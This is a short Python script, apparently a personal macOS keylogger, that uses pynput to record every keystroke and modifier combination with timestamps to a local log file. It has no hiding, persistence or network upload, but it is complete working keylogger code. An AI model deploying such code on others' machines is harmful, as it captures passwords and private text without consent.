from pynput import keyboard
import time

# 用于记录按键开始时间
key_start_time = 0
log_path="/Users/ziwen/code/keylogger/key.log"

ctrl=keyboard.Key.ctrl
alt=keyboard.Key.alt
cmd=keyboard.Key.cmd
ctrKeys=[ctrl,alt,cmd]

tmp=[]
buffer=[]

map_macos={
50: '`',18: '1',19: '2',20: '3',21: '4',23: '5',22: '6',26: '7',28: '8',25: '9',29: '0',27: '-',24: '=',12: 'q',13: 'w',14: 'e',15: 'r',17: 't',16: 'y',32: 'u',34: 'i',31: 'o',35: 'p',33: '[',30: ']',42: '\\',0: 'a',1: 's',2: 'd',3: 'f',5: 'g',4: 'h',38: 'j',40: 'k',37: 'l',41: ';',39: "'",6: 'z',7: 'x',8: 'c',9: 'v',11: 'b',45: 'n',46: 'm',43: ',',47: '.',44: '/'
}


def getKey(key):
    if hasattr(key,'vk') and key.vk in map_macos:
        return map_macos[key.vk]
    elif hasattr(key,'char'):
        return key.char
    else:
        return str(key)



def on_press(key):
    if key in ctrKeys or any(item in ctrKeys for item in buffer):
        buffer.append(key)
        tmp.append(key)
    else:
        log(getKey(key))
        

def on_release(key):
    try:
        if len(buffer)!=0 and len(tmp)>1:
            tmp.remove(key)
        elif len(buffer)!=0 and len(tmp)<=1:
            result=[getKey(item) for item in buffer]
            log('+'.join(result))
            tmp.clear()
            buffer.clear()
    except:
        tmp.clear()
        buffer.clear()
        pass
    
   
def log(msg):
    with open(log_path,'a') as f:
        timestamp = round(time.time(), 3)
        f.write(f"{timestamp},{msg}\n")

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
